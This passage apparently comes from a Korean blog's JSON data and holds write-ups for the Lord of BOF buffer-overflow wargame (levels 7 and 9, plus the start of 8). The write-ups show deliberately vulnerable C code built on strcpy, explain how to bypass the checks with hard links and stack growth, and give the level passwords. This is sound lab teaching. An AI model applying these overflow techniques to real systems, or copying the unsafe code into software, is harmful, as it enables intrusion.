class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token comment\">// buffer hunter</span>\r\n        <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>Stack frame structure:</p>\n<p>| i[4] |\r\n| buffer[40] |\r\n| Stack Frame Pointer |\r\n| Return address |\r\n| argc |\r\n| argv |\r\n| environ |</p>\n<p>이전 문제에 조건이 하나 더 추가되었다. argv[0]의 길이가 77이 되어야 한다. 링크를 이용해 이를 우회할 수 있을 것이다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 640px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 29.6969696969697%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA5klEQVR42nWOwW7DIBBEbVzF2LsLNrBgA4vjJFX//w+rJpXaHvr0NJrTaLrW3s/zo7WHyD1tTeRR5RaTAKzrmuZ5mWZrTEB0gG4YJqV0378Ng+pV3zk5iSpiRswz7IAZYB9H1jqOIwPsZCpSQSpExdhqbUMMKR1E1F1v7Xq246giJZettXocwuz3PVlLq7MxBo6e2T/TMfsYOaYtpti18xBptUopNZfCzIg0TbNdFiICRICX8Ks8G0K33bfAIQTvQ3DOWWu11pfLhYwhQ2T+wX7Rnc/TOWfm14ZHBKXUqMc/6B/1t/oTvXwYCXoJF/oAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/5f8d073b661ad43d0790a82d54865a2b/c9b55/0.webp 165w,\n/static/5f8d073b661ad43d0790a82d54865a2b/f2908/0.webp 330w,\n/static/5f8d073b661ad43d0790a82d54865a2b/0ba47/0.webp 640w\"\n              sizes=\"(max-width: 640px) 100vw, 640px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/5f8d073b661ad43d0790a82d54865a2b/04c57/0.png 165w,\n/static/5f8d073b661ad43d0790a82d54865a2b/d9ecf/0.png 330w,\n/static/5f8d073b661ad43d0790a82d54865a2b/6af66/0.png 640w\"\n            sizes=\"(max-width: 640px) 100vw, 640px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/5f8d073b661ad43d0790a82d54865a2b/6af66/0.png\"\n            alt=\"ln\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>하드 링크를 생성하였다. 하드 링크 파일을 생성하면 원본 파일과 inode number를 공유하기 때문에 원본 파일과 실질적으로 같은 파일이 된다. 권한 문제 때문에 하드 링크를 생성해야 한다. 하드 링크 파일이 위치하는 디렉토리의 이름은 70자로 하였다(./[2] + 디렉토리 이름[70] + /orge[5] == 7).</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 641px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 7.87878787878788%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAIAAADXZGvcAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAW0lEQVR42k3CywqDQAwF0BQ0DpOVcdM8Ormj/v83FoRCD4ciYoxh9rbHceiuWqjMHCicExPnfdUsc/vr5kYAIgIoc89Pqu69d5G+LsvWNhFhXltrzExErwf9fAG/UgkH6nS2/wAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/fb3e85bd0ae1464404a9aa4dbae9e41e/c9b55/1.webp 165w,\n/static/fb3e85bd0ae1464404a9aa4dbae9e41e/f2908/1.webp 330w,\n/static/fb3e85bd0ae1464404a9aa4dbae9e41e/de042/1.webp 641w\"\n              sizes=\"(max-width: 641px) 100vw, 641px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/fb3e85bd0ae1464404a9aa4dbae9e41e/04c57/1.png 165w,\n/static/fb3e85bd0ae1464404a9aa4dbae9e41e/d9ecf/1.png 330w,\n/static/fb3e85bd0ae1464404a9aa4dbae9e41e/c7dcc/1.png 641w\"\n            sizes=\"(max-width: 641px) 100vw, 641px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/fb3e85bd0ae1464404a9aa4dbae9e41e/c7dcc/1.png\"\n            alt=\"ex\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>해당 조건문이 우회되는 것을 확인하였다. 이후의 과정은 이전 문제와 같은 방식으로 해결하였다. 공격을 하는 상황과 유사하게 ‘Z’가 70번 반복되는 이름의 디렉토리를 생성한 후 그곳에 파일 orge를 복사하여 gdb로 분석하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 641px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.878787878787882%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA5UlEQVR42oXOzY7DIAwEYIP5KwkEYgOGtNv3f8sq1e55v8NInsPIMNciOntrKaWc07Zt+gsAlFJ3wE1rpbVSv9efOeUkWmvWWqeIzMmNay172kWE6CylDBFiFpFSjkeMcYsxxn3fYYzeeltrEjEz995a45xz7/04DuK7JeaTzpTzEKm30sdgZgghOGdR6+B9CMFYE4J3zqnv5//4eb+va9Va+xj1rCml+HiE4L2/JxARAIwxzjlrLQAgovPOea+VgtfrOUQQcdv263kNEWsMIsoYIpJzBgBmljmJCABSztfzkinWmg8rrxDcAS9tGwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/17168f8d75c993c61d7d101a04a64e80/c9b55/2.webp 165w,\n/static/17168f8d75c993c61d7d101a04a64e80/f2908/2.webp 330w,\n/static/17168f8d75c993c61d7d101a04a64e80/de042/2.webp 641w\"\n              sizes=\"(max-width: 641px) 100vw, 641px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/17168f8d75c993c61d7d101a04a64e80/04c57/2.png 165w,\n/static/17168f8d75c993c61d7d101a04a64e80/d9ecf/2.png 330w,\n/static/17168f8d75c993c61d7d101a04a64e80/c7dcc/2.png 641w\"\n            sizes=\"(max-width: 641px) 100vw, 641px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/17168f8d75c993c61d7d101a04a64e80/c7dcc/2.png\"\n            alt=\"argv addr\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>(중략)</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 53.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABsUlEQVR42j2SCZLrIAwFZUi84zhesEDsXjL3P+EU8Z9/AFW97hZ8fq4YI+dMCHGeR9qPrusAihhDSrvWGgCklCmlGBPnrKqbPaXzvOZpgpQiETHG2q7TWiulmqYGKJRSG27LPAPAe5q2bUPEoijKslIKNZEQHfjgiIhz1ratUrisa11XAAUiSinf7xEAxvf7Pmb5uFQKldai7+D6nP9nH8fuvOu6FqAIMYTgETcAWKXMFHviLM8+9v36XPP0hvM6nXN1XYlhCMF771+DYJwba0LwSuHNbK350hXPsiLSzrnXMEAIXkopRC+EkHJFxHF8PZ/lsiyIuCzz4/FY1mWapmEYWFFwzodBjOOY6Xxwxpgvc2et1Vq3TQNQaNJEel2XWxiRNtYwloXZPCqMrwE+P1dK6fHgfWY+Ygx9TgUhhhjD3+wtxhhTzMxVnVI8r/NmPkIWxvu+Tyn6P2Eu47t/wtbVexdCuI9j8Mex5xAxBlSKMdY0LRFpfXcGRNRaLct8p1IKifRXWKm1sta9BgEhOETk3ydxzmnSTWYGIrLWrusKANM0E5ExhjFWlpUxlKO8hl9QNjFjbCOMcQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/48788d85dba8572deae94a18594ca0bc/c9b55/3.webp 165w,\n/static/48788d85dba8572deae94a18594ca0bc/f2908/3.webp 330w,\n/static/48788d85dba8572deae94a18594ca0bc/84ad9/3.webp 601w\"\n              sizes=\"(max-width: 601px) 100vw, 601px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/48788d85dba8572deae94a18594ca0bc/04c57/3.png 165w,\n/static/48788d85dba8572deae94a18594ca0bc/d9ecf/3.png 330w,\n/static/48788d85dba8572deae94a18594ca0bc/d8f62/3.png 601w\"\n            sizes=\"(max-width: 601px) 100vw, 601px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/48788d85dba8572deae94a18594ca0bc/d8f62/3.png\"\n            alt=\"argv addr2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>argv[1]에 48자, argv[2]에 200자를 넣고 주소지를 확인하였다. argv[2]는 주소지\\xbffffb5c부터 위치함을 볼 수 있다. 이를 이용하여 아래와 같이 공격을 진행하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 640px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 20%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAtUlEQVR42jWN246DMAwFEUGQGJt0EzeEOJeGpf3/T1xRaedhpKN5OEPvvZ+3Wmu5lCSJmUMIOWfJ0l6t1FpblSzn73ld1/W+lXN+fz5DSuk4YqlFRFprMe4hhFqrpCSSSsnxiNY++Mlh3621iEhEsK5ENPTeSy38ZO+ccz/ee2b238HMzjkAUErN8zxN0/iPUmoc1RBjJKIV0RijtQYwsIIxsCwLgNFGwxdEhLsB0v2MRNu2/QGt5RISBNC0LwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/5893127a013816dffe6fe55429d837fc/c9b55/4.webp 165w,\n/static/5893127a013816dffe6fe55429d837fc/f2908/4.webp 330w,\n/static/5893127a013816dffe6fe55429d837fc/0ba47/4.webp 640w\"\n              sizes=\"(max-width: 640px) 100vw, 640px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/5893127a013816dffe6fe55429d837fc/04c57/4.png 165w,\n/static/5893127a013816dffe6fe55429d837fc/d9ecf/4.png 330w,\n/static/5893127a013816dffe6fe55429d837fc/6af66/4.png 640w\"\n            sizes=\"(max-width: 640px) 100vw, 640px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/5893127a013816dffe6fe55429d837fc/6af66/4.png\"\n            alt=\"exploit\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 106px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 42.45283018867924%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAA7DAAAOwwHHb6hkAAABO0lEQVR42o2Qa0+DMBiFy26wzTmjbsmczFhogbYUaLmvBXaN//8XGafRqDHx+XQ+vOecNwfo3c73CaPEdTzVdplIZJYR9AQASItSxiGEcHF/t7LtIMAejRwHch7zSGD0DNKqKmt9Pp6qslRaCZEIIR5XCwCMWjdN2x46fTO7ivLsuFe5PihVVNtKtQ3zXfAb48K77vX6Y8sCAIxM0zJHP09djzBKHQg9z31Y25Xezq4n5nQuRWIOjOn17VYrxnjIiUzlZDS4JBofBWmtylxUdV0WkvFINfV8Ph1aE4TcYd8YmmPOY8rYxl4vl4ueAf7L5/N/QqNws1q6CIdvS8WUUoQdnxDs+QhhjKHWNfEDCJ0gwIP+9zhEKQ28tCi60/58ful0LfNMN+3+cOIhIyzodjutVCpFkkQX65f/FdlEM3MggAQBAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/164d3583ca0a973aae9f4ee4e57bd51e/83134/5.webp 106w\"\n              sizes=\"(max-width: 106px) 100vw, 106px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/164d3583ca0a973aae9f4ee4e57bd51e/577dc/5.png 106w\"\n            sizes=\"(max-width: 106px) 100vw, 106px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/164d3583ca0a973aae9f4ee4e57bd51e/577dc/5.png\"\n            alt=\"my-pass\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>my-pass: timewalker</p>","categories":["writeup","wargame","pwnable"],"date":"February 05, 2016","description":"","id":"d848bfe7-8c3e-5b22-906f-d9f382c33743","keywords":["lob"],"slug":"/Lord-of-BOF-WriteUp-07/","title":"LOB 7번 (darkelf -> orge)","readingTime":{"text":"3 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#080808","images":{"fallback":{"src":"/static/b1458af82cada0da5462d2ac44e56c96/98851/0.png","srcSet":"/static/b1458af82cada0da5462d2ac44e56c96/4ec1c/0.png 150w,\n/static/b1458af82cada0da5462d2ac44e56c96/ca4aa/0.png 300w,\n/static/b1458af82cada0da5462d2ac44e56c96/98851/0.png 600w","sizes":"(min-width: 600px) 600px, 100vw"},"sources":[{"srcSet":"/static/b1458af82cada0da5462d2ac44e56c96/40ac4/0.webp 150w,\n/static/b1458af82cada0da5462d2ac44e56c96/9e761/0.webp 300w,\n/static/b1458af82cada0da5462d2ac44e56c96/2ea1b/0.webp 600w","type":"image/webp","sizes":"(min-width: 600px) 600px, 100vw"}]},"width":660,"height":400.40000000000003}}}},"body":"<p>source code:</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">﻿<span class=\"token comment\">/*\r\n        The Lord of the BOF : The Fellowship of the BOF\r\n        - vampire\r\n        - check 0xbfff\r\n*/</span>\r\n\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\r\n\r\n<span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token punctuation\">{</span>\r\n        <span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span><span class=\"token number\">40</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>argc <span class=\"token operator\">&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"argv error\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">47</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token char\">'\\xbf'</span><span class=\"token punctuation\">)</span>\r\n        <span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"stack is still your friend.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token comment\">// here is changed!</span>\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">46</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token char\">'\\xff'</span><span class=\"token punctuation\">)</span>\r\n        <span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"but it's not forever\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>Stack frame structure:</p>\n<p>| buffer[40] |\r\n| Stack frame pointer |\r\n| Return address |\r\n| argc |\r\n| argv |\r\n| environ |</p>\n<p>이전 문제와는 다르게 argv[1][46]의 값도 체크하고 있다. 환경변수 영역을 초기화시키지 않아서 환경변수를 응용하는 방법을 떠올릴 수 있지만 \\xbfff0000 이상의 위치에 환경변수가 위치하고 있기 때문에 이는 사용할 수 없다. 그렇다고 argv[0]을 이용할 수도 없다. 이 또한 \\xbfff0000 이상의 위치에 있기 때문이다.\r\n주소지 \\xbfff0000 아래로 내려가는 한 가지 방법으로 스택을 키우는 것이 있다. buffer에 많은 수의 문자열을 넣어 스택을 낮은 주소지 쪽으로 키우는 것이다. gdb를 실행시켜 buffer에 팔만개의 바이트를 입력하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 600px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 24.848484848484848%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAwklEQVR42n3OSZKDMAxAUREPki3LYPCEXQkr7n/FFOl9v/2v+nBdV60llwdzWNfonXv9LMsC/xtzppSOfW+tikhrreScUsqliIj33hjjnENrtdb0QP+jlAKJq4gwc4yRmUMIzF5EQgj6yehpHBmjlVKIaKwx2qDF5+u+78/703vLOY8xtm2NUcg57z0RWsS/f0IkclprAEAkJLLWwhizlJLSBgDHcbTe9n0HAA6hn72fHdEqrXvv53mKCADUWuecpeQvVHINVAT9SgIAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/b1458af82cada0da5462d2ac44e56c96/c9b55/0.webp 165w,\n/static/b1458af82cada0da5462d2ac44e56c96/f2908/0.webp 330w,\n/static/b1458af82cada0da5462d2ac44e56c96/e88ff/0.webp 600w\"\n              sizes=\"(max-width: 600px) 100vw, 600px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/b1458af82cada0da5462d2ac44e56c96/04c57/0.png 165w,\n/static/b1458af82cada0da5462d2ac44e56c96/d9ecf/0.png 330w,\n/static/b1458af82cada0da5462d2ac44e56c96/0a47e/0.png 600w\"\n            sizes=\"(max-width: 600px) 100vw, 600px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/b1458af82cada0da5462d2ac44e56c96/0a47e/0.png\"\n            alt=\"buffer argv\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>(중략)</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 595px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 7.87878787878788%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAIAAADXZGvcAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAZElEQVR42iXM0Q6DIAxG4f/CDQySUJfaWsAi7/+QZtu5/nJQSgHAzHNOH0PkABDXtV+X/wrhDcDMWm/jHkQEYNuyuyPnDGDfP6pymhF9XyHGWisfrCqvZQEgIqqnqP59Sqm39gD/rggFsj2oUgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/c876359b584f933a4ff0f143787a10d7/c9b55/1.webp 165w,\n/static/c876359b584f933a4ff0f143787a10d7/f2908/1.webp 330w,\n/static/c876359b584f933a4ff0f143787a10d7/536c8/1.webp 595w\"\n              sizes=\"(max-width: 595px) 100vw, 595px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/c876359b584f933a4ff0f143787a10d7/04c57/1.png 165w,\n/static/c876359b584f933a4ff0f143787a10d7/d9ecf/1.png 330w,\n/static/c876359b584f933a4ff0f143787a10d7/3dd3e/1.png 595w\"\n            sizes=\"(max-width: 595px) 100vw, 595px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/c876359b584f933a4ff0f143787a10d7/3dd3e/1.png\"\n            alt=\"buffer argv2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>이쯤 되니 주소지가 \\xbffe ... 이 되는 것을 확인할 수 있다. 이를 이용하여 페이로드를 다음과 같이 입력하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 641px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.878787878787882%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAArUlEQVR42pXOWxLCIAwFUF4Vh0cgFgIttBX3v0gH3YCemWTu/UrYvm3HeV7XWWuhnIio9T7GaG0fr7kz5es6W+/PMWopOVPvrfV+HAd7INZa930rtZZSWmtE5JyNYXLOan33AP5DSiHmcM65EIIZY7TWi1LLcrstk1SK/agUAgBrjbUG5in3yS6EAOAf62qt9d7PGgARvzXi/IwhYkrJec8Z439iMcY1rVJJ9r83sFcOh401dOAAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/ce2a573cdf69bea8810bac49a441c081/c9b55/2.webp 165w,\n/static/ce2a573cdf69bea8810bac49a441c081/f2908/2.webp 330w,\n/static/ce2a573cdf69bea8810bac49a441c081/de042/2.webp 641w\"\n              sizes=\"(max-width: 641px) 100vw, 641px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/ce2a573cdf69bea8810bac49a441c081/04c57/2.png 165w,\n/static/ce2a573cdf69bea8810bac49a441c081/d9ecf/2.png 330w,\n/static/ce2a573cdf69bea8810bac49a441c081/c7dcc/2.png 641w\"\n            sizes=\"(max-width: 641px) 100vw, 641px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/ce2a573cdf69bea8810bac49a441c081/c7dcc/2.png\"\n            alt=\"exploit\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>my-pass: music world</p>","categories":["writeup","wargame","pwnable"],"date":"February 05, 2016","description":"","id":"e3787896-a006-59d6-a85d-7f0e0fcdcd66","keywords":["lob"],"slug":"/Lord-of-BOF-WriteUp-09/","title":"LOB 9번 (troll -> vampire)","readingTime":{"text":"2 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#080808","images":{"fallback":{"src":"/static/b21235753cc2d07d8049f2f73241b522/81283/0.png","srcSet":"/static/b21235753cc2d07d8049f2f73241b522/921db/0.png 161w,\n/static/b21235753cc2d07d8049f2f73241b522/0dc75/0.png 321w,\n/static/b21235753cc2d07d8049f2f73241b522/81283/0.png 642w","sizes":"(min-width: 642px) 642px, 100vw"},"sources":[{"srcSet":"/static/b21235753cc2d07d8049f2f73241b522/e1eb6/0.webp 161w,\n/static/b21235753cc2d07d8049f2f73241b522/8fea6/0.webp 321w,\n/static/b21235753cc2d07d8049f2f73241b522/89380/0.webp 642w","type":"image/webp","sizes":"(min-width: 642px) 642px, 100vw"}]},"width":660,"height":399.9065420560747}}}},"body":"<p>source code:</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">﻿<span class=\"token comment\">/*\r\n        The Lord of the BOF : The Fellowship of the BOF\r\n        - troll\r\n        - check argc + argv hunter\r\n*/</span>\r\n\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\r\n\r\n<span class=\"token keyword\">extern</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>environ<span class=\"token punctuation\">;</span>\r\n\r\n<span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token punctuation\">{</span>\r\n        <span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span><span class=\"token number\">40</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token comment\">// here is changed</span>\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>argc <span class=\"token operator\">!=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n                